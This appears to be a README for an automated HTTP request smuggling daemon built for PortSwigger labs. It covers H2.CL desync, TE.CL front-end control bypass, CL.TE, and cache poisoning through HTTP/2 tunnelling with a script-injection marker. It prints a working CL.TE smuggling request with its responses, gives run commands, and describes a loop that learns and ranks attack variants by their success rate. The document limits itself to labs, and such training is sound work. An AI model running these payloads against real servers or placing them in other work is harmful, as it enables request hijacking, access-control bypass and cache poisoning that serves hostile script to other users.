# Daemon lab configs

## Learning from audit logs

The daemon re-reads its `log_file` at startup. Each record now carries a
`learning` label (`host`, `variant`, `mutation`, `tech_stack`, `finding`), and
the daemon ranks `variant: "auto"` choices and `differential-fuzz` mutations by
the smoothed success rate from those records. `learning_sources` can point to
previous labs' audit files; their technique-level success becomes a global
prior (`host: "*"`) that is overridden by evidence from the current host. The
source JSON is never mutated; `GET /experience` on `control_addr` shows the
learned cells. Set `"learning_enabled": false` to disable the feedback loop.

## H2.CL (HTTP/2 downgrade desync)

`daemon-h2-cl.json` sends HEADERS with a deliberately short
`declared_length` and a DATA frame carrying a full HTTP/1.1 request. A
front-end that downgrades to HTTP/1.1 while trusting the declared length leaves
the surplus DATA bytes on its back-end connection; the victim's next request
receives the smuggled response. The DATA can be rendered from `smuggled_*`
fields or supplied byte-exactly in `body`; the latter is needed when the
smuggled request's own `Content-Length` must intentionally differ from the
literal bytes that follow it. No base64 Universal Key is needed.

For the lab pattern, the exploit-server file is stored at `/resources` and the
smuggled request declares `Content-Length: 5` while carrying the literal body
`x=1`. With `skip_victim: true`, the poisoned response is left queued for the
real browser; `hold_after_poison` can keep the client socket open while the
victim visits. `same_connection_victim`, `read_extra_stream`, `victim_delay`,
`declared_lengths`, `scheme` and `smuggled_prefix` are diagnostic switches used
while mapping a new front-end. They are not proof by themselves: the success
marker must still appear in a victim response or the lab status must change.

The full lab case — including provenance, the exact evidence files and the
negative results — lives in [`playbooks/h2-cl-resources-redirect.json`](../../playbooks/h2-cl-resources-redirect.json).
It can be imported into the zero-day vault with
`research/knowledge_base.py import-playbook`, or loaded as a provenance-tagged
ordering prior with `omnislashd -playbook ...`. See
[`playbooks/README.md`](../../playbooks/README.md) for the honest boundary
between replay and learning.

## TE.CL chain (front-end security control bypass)

`daemon-tecl-chain.json` builds the TE.CL payload from structured fields — no
base64 Universal Key needed. The front-end honours `Transfer-Encoding`, the
back-end honours `Content-Length: 4`, and the chunk data is parsed by the
back-end as a second request. Set `smuggled_path`, `smuggled_host` and
`success_contains` for the target lab; `variant: "te.cl"` selects this mode.
Every stage uses a separate connection from the same pinned session.

## HTTP request smuggling, basic CL.TE

- `config.lab.json` — transport: trusted tier, direct egress, scope locked to
  one lab host on port 443.
- `daemon.json` — one job, `smuggle-chain`, success marker
  `Unrecognized method GPOST`.

Run:

```bash
go run ./cmd/omnislashd -config examples/daemon/daemon.json -once
```

The daemon writes one JSON object per attempt to `lab-clte.jsonl` (gitignored)
and prints a summary. Exit code is 0 only when the job reached its marker.

## Web cache poisoning via HTTP/2 request tunnelling

- `config.cache-tunnel.json` — transport for the H2 lab.
- `daemon-cache-tunnel.json` — one `h2-tunnel` job with `tls: "h2"`, marker
  `<script>alert(1)</script>` and `success_finding: "cache_poisoned"`.

```bash
go run ./cmd/omnislashd -config examples/daemon/daemon-cache-tunnel.json -once
```

The probe sends a HEAD request whose `:path` value contains a complete second
request plus large static padding requests. The front-end downgrades to
HTTP/1.1, over-reads the tunnelled responses into the HEAD body, and caches the
mixed response under `/`. A following normal `GET /` must return the marker;
only then does the job succeed (`h2_tunnel_confirmed` plus `cache_poisoned`).

## What the probe does

The lab front-end honours `Content-Length`; the back-end honours
`Transfer-Encoding: chunked`. The probe sends:

```http
POST / HTTP/1.1
Host: <lab>
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

The front-end forwards six bytes (`0\r\n\r\nG`). The back-end sees the zero
chunk, ends the body, and keeps `G` in its connection buffer. The probe then
opens a second connection (same pinned session, same egress) and sends:

```http
POST / HTTP/1.1
Host: <lab>
Content-Length: 0
```

The back-end prepends the leftover byte and parses `GPOST / HTTP/1.1`, so the
response is:

```http
HTTP/1.1 403 Forbidden

"Unrecognized method GPOST"
```

That is the lab objective. `SmuggleChainProbe` reports `smuggle_confirmed`
with high confidence and waits for `attempts` tries, because the front-end's
back-end pool may need a few attempts before the victim lands on the poisoned
socket.

## Replacing an expired instance

PortSwigger lab instances are disposable. If the host no longer responds,
start a fresh instance of the same lab and update:

- `allow_hosts` in the matching transport config (`config.lab.json` or
  `config.cache-tunnel.json`);
- `target.addr` and `target.host` in the matching daemon config
  (`daemon.json` or `daemon-cache-tunnel.json`).

Only run this against your own lab instance.
